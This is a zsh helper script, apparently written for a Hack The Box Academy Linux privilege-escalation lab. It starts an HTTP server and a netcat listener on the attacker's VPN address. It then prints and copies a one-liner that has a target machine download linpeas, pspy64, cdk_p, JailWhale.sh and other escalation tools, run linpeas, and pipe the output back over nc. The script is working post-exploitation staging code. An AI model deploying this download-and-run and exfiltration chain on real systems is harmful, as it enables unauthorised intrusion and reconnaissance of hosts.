#! /bin/zsh

while getopts ":i:z" opt; do
  case $OPTARG in
   -*) echo "ERROR: Incorrect arguments."
  exit 1;;
  esac
  case $opt in
    i) interface=$OPTARG
    ;;
    z) zipDrop='1'
    ;;
    "?") echo "Invalid option: '$OPTARG'.\nTry '$0 -h' for usage information." >&2
    exit 1;;
    ":") echo "Error: empty value for the argument -$OPTARG"
    exit 1;;
  esac
done

[[ -z $interface ]] && echo "[+] Usage: $0 -i <iface>" && exit 1

YELLOW="\e[1;33m"
NC="\e[0m"

vared -p "[*] Enter a name for a Linpeas scan (optional): " -c scanName

my_vpn_ip=`ip addr show dev ${interface} | grep -oP 'inet \K[\d.]+'`

if [[ $zipDrop == '1' ]]; then
    echo -n "Serving ZIP archive..."
    echo -n "Run the following commands in a target's machine shell terminal:\n"
    printf "${YELLOW}wget http://${my_vpn_ip}:9999/priv.zip; unzip priv.zip; \
    chmod +x ./linpeas.sh; sh ./linpeas.sh -e | nc -q 5 ${my_vpn_ip} 10000; \
    chmod +x ./ch; chmod +x ./pspy64; chmod +x ./cdk_p; chmod +x ./priv.sh; chmod +x ./JailWhale.sh${NC}\n"

    echo -n "wget http://${my_vpn_ip}:9999/priv.zip; unzip priv.zip; \
    chmod +x ./linpeas.sh; sh ./linpeas.sh -e | nc -q 5 ${my_vpn_ip} 10000; \
    chmod +x ./ch; chmod +x ./pspy64; chmod +x ./cdk_p; chmod +x ./priv.sh; chmod +x ./JailWhale.sh" | xclip -selection clipboard
    echo
    echo "The above oneliner also has been copied to your clipboard."
    echo
    echo 'Press any key to run an http server and a netcat listener...'; read -k1 -s
    
    tmux split-window 
    tmux send -t 1 'cd /home/shyngys/labs/HTB/Academy/linux-privesc; /bin/python3 -m http.server 9999' ENTER
    tmux send -t 0 "/bin/nc -lvnp 10000 | tee /home/shyngys/linpeas-logs/privesc-${scanName}$(date '+%d-%m-%Y').log" ENTER
else
    echo
    echo -n "Run the following commands in a target's machine shell terminal:\n"
    printf "${YELLOW}wget http://${my_vpn_ip}:9999/linpeas.sh;chmod +x ./linpeas.sh; sh ./linpeas.sh |\
    nc -q 5 ${my_vpn_ip} 10000; \
    wget http://${my_vpn_ip}:9999/ch; chmod +x ./ch; \
    wget http://${my_vpn_ip}:9999/pspy64; chmod +x ./pspy64; \
    wget http://${my_vpn_ip}:9999/cdk_p; chmod +x ./cdk_p; \
    wget http://${my_vpn_ip}:9999/priv.sh; chmod +x ./priv.sh; \
    wget http://${my_vpn_ip}:9999/JailWhale.sh; chmod +x ./JailWhale.sh \
    wget http://${my_vpn_ip}:9999/lse.sh; chmod +x ./lse.sh${NC}\n"

    echo -n "wget http://${my_vpn_ip}:9999/linpeas.sh;chmod +x ./linpeas.sh; sh ./linpeas.sh |\
    nc -q 5 ${my_vpn_ip} 10000; \
    wget http://${my_vpn_ip}:9999/ch; chmod +x ./ch; \
    wget http://${my_vpn_ip}:9999/pspy64; chmod +x ./pspy64; \
    wget http://${my_vpn_ip}:9999/cdk_p; chmod +x ./cdk_p; \
    wget http://${my_vpn_ip}:9999/priv.sh; chmod +x ./priv.sh; \
    wget http://${my_vpn_ip}:9999/JailWhale.sh; chmod +x ./JailWhale.sh \
    wget http://${my_vpn_ip}:9999/lse.sh; chmod +x ./lse.sh" | xclip -selection clipboard
    echo
    echo "The above oneliner also has been copied to your clipboard."
    echo
    echo 'Press any key to run an http server and a netcat listener...'; read -k1 -s
    tmux split-window 
    tmux send -t 1 'cd /home/shyngys/labs/HTB/Academy/linux-privesc; /bin/python3 -m http.server 9999' ENTER
    tmux send -t 0 "/bin/nc -lvnp 10000 | tee /home/shyngys/linpeas-logs/privesc-${scanName}$(date '+%d-%m-%Y').log" ENTER
fi
